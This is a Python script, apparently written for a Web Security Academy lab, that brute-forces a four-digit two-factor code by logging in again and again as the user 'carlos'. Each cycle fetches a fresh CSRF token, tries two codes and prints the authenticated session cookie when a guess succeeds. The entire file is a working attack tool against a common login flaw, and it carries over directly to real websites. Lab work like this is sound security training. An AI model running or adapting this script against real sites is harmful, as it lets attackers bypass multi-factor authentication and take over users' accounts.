import requests
import re
import os
import time
import logging
import argparse


##CONFIGURATION INITIAL SETUP
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(os.path.dirname(__file__), "..", "docs", "run.log")),
        logging.StreamHandler()  # continue to print in terminal
    ]
)

log = logging.getLogger(__name__)


##CONSTANTS
CODES_PATH = os.path.join(os.path.dirname(__file__), "..", "docs", "codes.txt")
USERNAME = "carlos"
PASSWORD = "montoya"


##FUNCTION RESPONSIBLE FOR PARSING PROGRAM'S ARGUMENTS
def parse_args():
    parser = argparse.ArgumentParser(
         description="2FA brute-force bypass via re-authentication cycling"
    )
    parser.add_argument(
         "--target",
         required=True,
         help="Base URL of the lab, e.g. https://xxxx.web-security-academy.net"
    )
    return parser.parse_args()


##FUNCTION RESPONSIBLE FOR EXTRACTING CSRF VALUE FROM A HTML CODE
def extract_csrf(html_resp):
    match = re.search(r'name="csrf" value="([^"]+)"', html_resp)
    if match is None:
        raise Exception(f"CSRF not found! Response:\n{html_resp}")
    csrf_token = match.group(1)
    return csrf_token


##FUNCTION RESPONSIBLE FOR LOADING CODES WORDLIST (RANGE: 0000 - 9999)
def load_codes(file_path):
    with open(file_path, "r") as f:
            codes = [line.strip() for line in f]
    return codes


##FUNCTION RESPONSIBLE FOR EXECUTING A COMPLETE LOGIN CYCLE: LOGIN -> TWO 2FA TRIES -> RETURN (success: bool, new_csrf: str, new_index: int)
def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
    lab_link = base_url + "/login"
    
    response = s.post(lab_link, 
                            data={
                              "csrf": updated_csrf_token,
                              "username": USERNAME,
                              "password": PASSWORD
                              },
                            timeout=15)
    
    csrf_login2 = extract_csrf(response.text)
    auth_endpoint = lab_link + "2"

    code1 = codes[index % len(codes)]
    code2 = codes[(index + 1) % len(codes)]

    
    r1 = s.post(auth_endpoint,
                data={
                    "csrf": csrf_login2,
                    "mfa-code": code1
                },
                allow_redirects=False,
                timeout=15
    )

    log.info("Testing code {}...".format(code1))

    if r1.status_code == 302:
            log.info("Success! Code: {}".format(code1))
            final = s.get(base_url + "/my-account", timeout=15)
            confirmed = "log out" in final.text.lower()
            log.info(f"[/my-account] status: {final.status_code} | confirmed: {confirmed}")
            return True, s.cookies.get("session"), None, None
    
    log.info("Code failed!")
    
    r2 = s.post(auth_endpoint,
                data={
                    "csrf": csrf_login2,
                    "mfa-code": code2
                },
                allow_redirects=False,
                timeout=15
    )

    log.info("Testing code {}...".format(code2))
    
    if r2.status_code == 302:
        log.info("Success! Code: {}".format(code2))
        final = s.get(base_url + "/my-account", timeout=15)
        confirmed = "log out" in final.text.lower()
        log.info(f"[/my-account] status: {final.status_code} | confirmed: {confirmed}")
        return True, s.cookies.get("session"), None, index
    else:
        log.info("Code failed!")
        new_csrf = extract_csrf(r2.text)
        return False, None, new_csrf, (index + 2)%len(codes)

    

def main():
    args = parse_args()
    base_url = args.target
    cycle_num = 0
    index = 0

    codes = load_codes(CODES_PATH)
    s = requests.Session()

    response = s.get(base_url + "/login", timeout=15)
    csrf_token = extract_csrf(response.text)

    while (True):
        try:
            start = time.perf_counter()
            sucesso, session_cookie, csrf_token, index = execute_login_cycle(s, base_url, csrf_token, index, codes)
            duration = time.perf_counter() - start
            cycle_num += 1

            log.info(f"[Cycle {cycle_num}] {duration:.2f}s | actual index: {index}")

            if sucesso:
                log.info("Authenticated session cookie: {}".format(session_cookie))
                break
        except requests.exceptions.RequestException as e:
            log.warning(f"[NETWORK] Transitory error, trying again: {e}")
            time.sleep(2)
            continue
        except Exception as e:
             log.error(f"[Fatal] Unexpected failure: {e}")
             raise

if __name__ == "__main__":
    main()